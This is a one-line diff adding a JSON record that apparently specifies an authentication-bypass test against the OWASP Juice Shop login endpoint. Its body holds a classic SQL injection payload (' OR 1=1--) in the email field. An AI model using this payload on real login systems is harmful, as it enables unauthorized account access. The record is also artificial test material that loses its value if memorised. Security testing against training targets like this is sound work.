@@ -1,0 +1,1 @@
+{"version":1,"target":"juice-shop","class":"auth-bypass","oracle":"authenticated-as","endpoint":"POST /rest/user/login","steps":{"kind":"auth-bypass","method":"POST","path":"/rest/user/login","body":"{\"email\":\"' OR 1=1--\",\"password\":\"janus-not-the-password\"}"}}
